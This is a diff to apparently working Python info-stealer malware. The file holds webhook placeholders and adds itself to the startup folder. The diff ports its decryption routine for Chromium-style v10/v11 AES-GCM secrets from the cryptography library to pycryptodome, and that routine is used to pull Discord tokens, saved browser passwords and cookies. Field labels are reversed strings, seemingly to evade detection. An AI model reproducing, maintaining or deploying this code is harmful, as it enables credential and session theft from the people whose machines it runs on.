@@ -13,8 +13,8 @@ import shutil
 import tempfile
 from sys import executable, stderr
 from ctypes import *
-from pathlib import Path
 from json import loads, dumps, load, dump
+from pathlib import Path
 
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
@@ -36,15 +36,24 @@ else:
     StartupMessage = 'Error while adding Trap into the startup folder' 
 requirements = [
     ["requests", "requests"],
-    ["cryptography", "cryptography"]
+    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
+for module in requirements:
+    try: 
+        __import__(module[0])
+    except:
+        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
+        time.sleep(3)
+
+from Cryptodome.Cipher import AES
+
+
 for modl in requirements:
     try: __import__(modl[0])
     except:
         subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
         time.sleep(3)
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+
 
 import requests
 def sql_connect(database_path):
@@ -280,20 +289,17 @@ def fakegen():
         print(f"An error occurred: {e}")
 
 
-def decrval(buff, master_key=None):
-    try:
+def DecryptValue(buff, master_key=None):
         starts = buff.decode(encoding='utf8', errors='ignore')[:3]
         if starts == 'v10' or starts == 'v11':
             iv = buff[3:15]
-            tag = buff[-16:] 
-            payload = buff[15:-16]  
-            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
-            decryptor = cipher.decryptor()
-            decrypted_pass = decryptor.update(payload) + decryptor.finalize()
-            decrypted_pass = decrypted_pass.decode('utf-8')
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16]
+            try: decrypted_pass = decrypted_pass.decode()
+            except:pass
             return decrypted_pass
-    except:
-        pass
 
 def check_python_or_convert(file_path):
     _, file_extension = os.path.splitext(file_path)
@@ -515,9 +521,8 @@ def avs():
 
         return content
 
-    except subprocess.CalledProcessError as e:
-        pass
-    except Exception as e:
+
+    except:
         pass
 
     return None
@@ -1545,7 +1550,7 @@ def GetDiscord(path, arg):
                 for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                     for Tokq in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                         global Tokqs
-                        TokqDecoded = decrval(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
+                        TokqDecoded = DecryptValue(b64decode(Tokq.split('dQw4w9WgXcQ:')[1]), master_key)
                         if checkTokq(TokqDecoded):
                             if not TokqDecoded in Tokqs:
                                 Tokqs += TokqDecoded
@@ -1561,16 +1566,16 @@ Passw = []
 def getPassw(path, arg):
 
     try:
-        def decrval(buff, master_key=None):
+        def DecryptValue(buff, master_key=None):
             starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-            if starts in ['v10', 'v11']:
+            if starts == 'v10' or starts == 'v11':
                 iv = buff[3:15]
-                tag = buff[-16:]  
-                payload = buff[15:-16]  
-                cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag), backend=default_backend())
-                decryptor = cipher.decryptor()
-                decrypted_pass = decryptor.update(payload) + decryptor.finalize()
-                decrypted_pass = decrypted_pass.decode('utf-8')
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)
+                decrypted_pass = decrypted_pass[:-16]
+                try: decrypted_pass = decrypted_pass.decode()
+                except:pass
                 return decrypted_pass
         global Passw, PasswCount
         if not os.path.exists(path): return
@@ -1607,7 +1612,7 @@ def getPassw(path, arg):
                         if not old in paswWords: paswWords.append(old)
                 us = 'emanresU'
                 ur = 'lrU'
-                Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {decrval(row[2], master_key)}")
+                Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
                 PasswCount += 1
         writeforfile(Passw, 'passw')
     except Exception as e:
@@ -2880,7 +2885,7 @@ def getCook(path, arg):
         for row in data: 
             if row[0] != '':
 
-                Cookies.append(f"{row[0]}     {row[1]}        {decrval(row[2], master_key)}")
+                Cookies.append(f"{row[0]}     {row[1]}        {DecryptValue(row[2], master_key)}")
                 CookiCount += 1
 
         writeforfile(Cookies, 'cook')
